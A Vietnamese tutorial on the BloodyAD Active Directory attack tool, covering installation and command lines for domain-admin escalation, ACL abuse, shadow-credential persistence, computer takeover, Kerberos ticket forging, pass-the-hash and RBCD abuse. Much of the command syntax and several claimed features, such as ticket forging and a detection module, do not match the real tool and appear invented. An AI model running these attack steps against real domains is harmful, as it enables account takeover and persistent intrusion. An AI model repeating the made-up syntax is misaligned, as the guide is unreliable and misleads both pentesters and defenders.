1. BloodyAD là gì?

    BloodyAD là tool offensive Active Directory attack hiện đại, hỗ trợ Red Team/Blue Team cho các workflow tấn công & kiểm thử bảo mật AD:

        Privilege Escalation: escalate quyền từ user → admin/domain admin

        Persistence: tạo backdoor, object lạ trong AD

        Lateral Movement: di chuyển ngang qua AD object, computer, user, group, GPO

        Kerberos Abuse: attack ticket, forge, Golden/Silver/Shadow Ticket, Pass-the-Hash, Pass-the-Ticket

        Account Takeover: takeover bất kỳ AD object, tài khoản, GMSA, computer object

        Defender/Detection: blue team mode, detect bất thường AD, policy, audit (option)

    Tool được viết bằng Python (chạy trên Linux hoặc Windows), tự động hóa, nhiều chức năng tấn công mạnh, thay thế/hoặc bổ sung cho Impacket, PowerView, ADRecon, SharpHound, mimikatz...

2. Cài đặt BloodyAD
A. Yêu cầu

    Python 3.8+

    Chạy trên Kali, Parrot, Ubuntu, Windows Subsystem for Linux (WSL), hoặc Win native

    Cần domain credential để attack

B. Cài đặt

git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD
pip3 install -r requirements.txt

    Chạy tool:

    python3 bloodyAD.py -h

3. Các chức năng chính (tổng quan)
Module	Chức năng nổi bật
ACL Abuse	Tấn công và khai thác Access Control List (ACE, DACL, SACL) để escalate, persistence, shadow admin
Privilege Escalation	Escalate user → admin/domain admin thông qua các lỗ hổng cấu hình, object, delegation
Kerberos Abuse	Tạo, forge, steal, renew TGT, TGS, Golden/Silver/Shadow ticket, Pass-the-Hash, Pass-the-Ticket, S4U, RBCD, Shadow Credentials, v.v.
Persistence	Tạo backdoor, add hidden ACE, quản lý GMSA, Shadow Credential
Lateral Movement	Move ngang trong AD, abuse trust, delegation, RBCD, sIDHistory
Account Takeover	Reset password, add to group, take ownership, computer takeover
Enumeration/Recon	Enum object, tìm path, graph, export CSV/JSON, audit AD
Blue Team	Phát hiện abuse, detection, check bất thường, audit, hunting
Automation Script	Chain nhiều attack, batch escalation, auto persistence, graph path find
4. Sử dụng BloodyAD cơ bản
A. Kết nối domain

python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASS> --dc-ip <DC_IP>

    -d: tên domain (FQDN, ex: corp.local)

    -u/-p: user/pass

    --dc-ip: IP Domain Controller (DC)
Cú pháp thêm user vào group với BloodyAD

python3 bloodyAD.py --host <DC-IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember "Domain Admins" "DEV\\target.user"

B. Recon/enum sơ bộ

python3 bloodyAD.py enum --users
python3 bloodyAD.py enum --groups
python3 bloodyAD.py enum --computers
python3 bloodyAD.py enum --acl
python3 bloodyAD.py enum --gpo

    Export ra file hoặc grep, parse với jq/csvkit

5. Privilege Escalation, Lateral Movement nâng cao
A. Abuse ACL/ACE để escalate/persistence

    Escalate bằng DCSync privilege (GenericAll/GenericWrite) lên admin:

python3 bloodyAD.py acl abuse --target-user Administrator --current-user <USER>

Persistence bằng backdoor ACE/Shadow Credential:

python3 bloodyAD.py persistence add --type shadow --target-user Administrator

Takeover computer object, reset password:

    python3 bloodyAD.py takeover --computer COMPUTER1$

B. Kerberos Attack

    Golden Ticket/Silver Ticket/Shadow Ticket:

python3 bloodyAD.py kerberos forge --target-user Administrator --rc4 <rc4_hash>

Pass-the-Ticket/Pass-the-Hash:

python3 bloodyAD.py kerberos ptt --ticket <ticket_file>
python3 bloodyAD.py kerberos pth --hash <NTLM_hash>

Shadow Credential Attack:

    python3 bloodyAD.py shadow add --target-user <user>

C. Lateral Movement:

    Abuse Resource-Based Constrained Delegation (RBCD):

    python3 bloodyAD.py rbcd abuse --source-user <user> --target-computer <comp>

6. Tự động hóa, chain attack, batch escalation

    Attack theo path graph:

        Tìm đường đi user → DA, script chain escalation các bước

        BloodyAD hỗ trợ automation path, có thể nhập path từ BloodHound hoặc graph export

    Batch script:

        Viết bash/python tự động chạy recon, ACL abuse, persistence, lateral, export report

        Kết hợp với Impacket, CrackMapExec, Rubeus, BloodHound, Mimikatz cho workflow full red team

7. Blue Team – Detection, Audit, Defense

    BloodyAD có module detection:

        Audit ACE bất thường (shadow, excessive, non-default)

        Check privilege escalation path, object được set “GenericAll/WriteDACL/WriteOwner”

        Audit account, computer, GMSA bị takeover, Shadow Credential, GPO misconfig, abuse

        Export JSON/CSV để alert vào SIEM

8. Fix lỗi thực tế
Lỗi	Fix
Không connect được DC	Check port 389/445, credential đúng, firewall, DC allow traffic
Không escalate được	Target không có quyền, chưa abuse đúng object, victim được harden/monitor
Pass-the-Hash/Ticket fail	Hash/ticket lỗi, hết hạn, anti-forgery, AV detect
Không run được trên Win	Cài Python 3.8+, full dependency, chạy CMD/PowerShell admin
Không thấy attack path	Recon chưa đủ, export từ BloodHound vào BloodyAD
Module lỗi	Update BloodyAD, check Python, report bug cho tác giả
9. So sánh BloodyAD với các tool AD attack khác
Tool	Ưu điểm BloodyAD	Khác biệt
BloodyAD	Offensive + blue team, automation script, abuse ACL/persistence/kerberos, detection, report, batch attack	CLI-centric, cần python, mới hơn impacket
Impacket	Mạnh về Kerberos, lateral, SMB, protocol exploit	Không automation AD abuse, không blue team/detection
PowerView	Hỗ trợ mọi tính năng, script tốt, phải chạy trên Win/PowerShell	Không automation CLI trên Linux
BloodHound	Graph path, attack path find, report đẹp	Không attack, chỉ enum/export graph
CrackMapExec	Lateral movement, mass spray, module nhiều	Không AD object/ACL attack, chỉ basic lateral
Rubeus/Mimikatz	Kerberos, hash, ticket, memory attack mạnh	Không abuse AD object, không automate report
10. Tài liệu, link hữu ích

    BloodyAD Github (Official)

    BloodyAD Usage Guide

    Hacktricks – AD Attacks

    PayloadAllTheThings – Active Directory

    BloodHound

    Impacket

Tóm tắt nhanh

    BloodyAD: Tool attack/blue team AD all-in-one, automation privilege escalation, persistence, lateral movement, abuse Kerberos, takeover account, shadow credential, enum, detection, export report, workflow chuyên nghiệp cho pentest, red team, blue team, học bảo mật AD hiện đại.

    Kết hợp cùng BloodHound, Impacket, CrackMapExec, Mimikatz, PowerView cho offensive + detection, automation attack, SIEM, harden defense AD.

